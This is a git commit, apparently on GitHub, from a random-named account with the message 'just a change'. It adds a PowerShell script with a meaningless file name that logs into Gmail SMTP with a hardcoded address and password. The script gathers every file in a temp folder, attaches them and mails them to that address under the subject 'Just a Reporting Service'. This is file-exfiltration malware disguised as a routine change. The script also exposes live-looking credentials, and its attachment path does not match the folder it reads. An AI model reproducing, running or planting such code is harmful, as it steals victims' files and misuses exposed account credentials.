822bbc6d78316e362f69a06a89b3ccec26bf7f2a
sygwtopshvpkrmpfuupy <149439027+sygwtopshvpkrmpfuupy@users.noreply.github.com>
2023-12-21 15:33:29 -0300

    just a change

---
+++ alxkdiepw.ps1
@@ -0,0 +1,18 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('enjuloverr@gmail.com', 'Pacific@1337');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'enjuloverr@gmail.com'
+$ReportEmail.To.Add('enjuloverr@gmail.com')
+$ReportEmail.Subject = 'Just a Reporting Service'
+$ReportEmail.Body = '.' 
+$files=Get-ChildItem "$env:TEMP\kzldj"
+Foreach($file in $files)
+{
+Write-Host “Attaching File :- ” $file
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$ReportEmail.Attachments.Add($attachment)
+$SMTPInfo.Send($ReportEmail)
+}
+write-host "yay"
